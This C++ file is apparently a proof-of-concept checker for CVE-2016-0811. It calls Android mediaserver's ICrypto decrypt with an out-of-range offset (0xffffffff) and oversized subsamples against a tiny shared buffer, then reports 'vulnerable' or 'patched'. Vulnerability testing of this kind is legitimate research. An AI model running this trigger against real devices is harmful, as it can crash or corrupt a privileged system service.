/*
* @Author: liukun
* @Date:   2016-08-30 14:47:41
* @Last Modified by:   LK_mac
* @Last Modified time: 2016-09-01 15:15:22
*/

#include <utils/Log.h>
#define TAG "CVE-2016-0811"


#include <stdio.h>
#include <binder/IInterface.h>
#include <binder/IMemory.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryHeapBase.h>
#include <binder/MemoryBase.h> 
#include <StrongPointer.h>
#include <media/ICrypto.h>
#include <media/IMediaPlayerService.h>
#include <media/hardware/CryptoAPI.h>    //android::CryptoPlugin::SubSample

using namespace android;
#define EINVAL 22

// virtual ssize_t decrypt(
//             bool secure,
//             const uint8_t key[16],
//             const uint8_t iv[16],
//             CryptoPlugin::Mode mode,
//             const sp<IMemory> &sharedBuffer, size_t offset,
//             const CryptoPlugin::SubSample *subSamples, size_t numSubSamples,
//             void *dstPtr,
//             AString *errorDetailMsg)

static android::sp<ICrypto> getBpCrypto()
{
	android::sp<IServiceManager> sm = defaultServiceManager();

    android::sp<IBinder> binder =
        sm->getService(String16("media.player"));
    android::sp<IMediaPlayerService> service =
        interface_cast<IMediaPlayerService>(binder);
    if (service == NULL) {
        return NULL;
    }
    android::sp<ICrypto> crypto = service->makeCrypto();

    if (crypto == NULL || (crypto->initCheck() != OK && crypto->initCheck() != NO_INIT)) {
        return NULL;
    }
    return crypto;
}

// 设置size
#define SHARED_BUFFER_SIZE 4
static sp<IMemory> getBpSharedBuffer()
{
    sp<MemoryHeapBase> heap = new MemoryHeapBase(SHARED_BUFFER_SIZE, 0, "SharedBuffer");
    sp<MemoryBase> mMemory = new MemoryBase(heap, 0, SHARED_BUFFER_SIZE);
    return mMemory;

    /**
     * external/Vulnerbility/0811/test.cpp:77:18: error: passing 'const android::sp<android::IMemory>' as 'this' argument of 'android::sp<T>& android::sp<T>::operator=(const android::sp<T>&) [with T = android::IMemory]' discards qualifiers [-fpermissive]
     *    sharedBuffer = getBpSharedBuffer();
     */
}

int main() {
    android::sp<ICrypto> crypto = getBpCrypto();

    bool secure = false;
    const uint8_t key[16] = {1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4};
    const uint8_t iv[16] = {1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4};
    
    // init
    // 
    // sharedBuffer-> size = totalsize + offset    (uint)
    enum CryptoPlugin::Mode mode = CryptoPlugin::Mode::kMode_AES_CTR;
    // mode = (enum CryptoPlugin::Mode)1;
    sp<IMemory> sharedBuffer;
    
    sharedBuffer = getBpSharedBuffer(); 
    size_t offset = 0xffffffff;   //vul   
    size_t numSubSamples = 1;   

    CryptoPlugin::SubSample *subSamples = new CryptoPlugin::SubSample[numSubSamples];  //subSamples = numSubSamples * sizeof(SubSample) 
    subSamples[0].mNumBytesOfClearData = 1;
    subSamples[0].mNumBytesOfEncryptedData = 3;


    void* dstPtr = NULL;
    AString* errorDetailMsg = NULL;
    
    ssize_t res = crypto->decrypt(secure, key, iv, mode, sharedBuffer, offset, subSamples, numSubSamples, dstPtr, errorDetailMsg);

    if (res == -EINVAL)
    {
        printf("Vulnerbility \n");
    }
    else
    {
        printf("patch了！ ret=%ld\n", res);
    }

    return 0;



}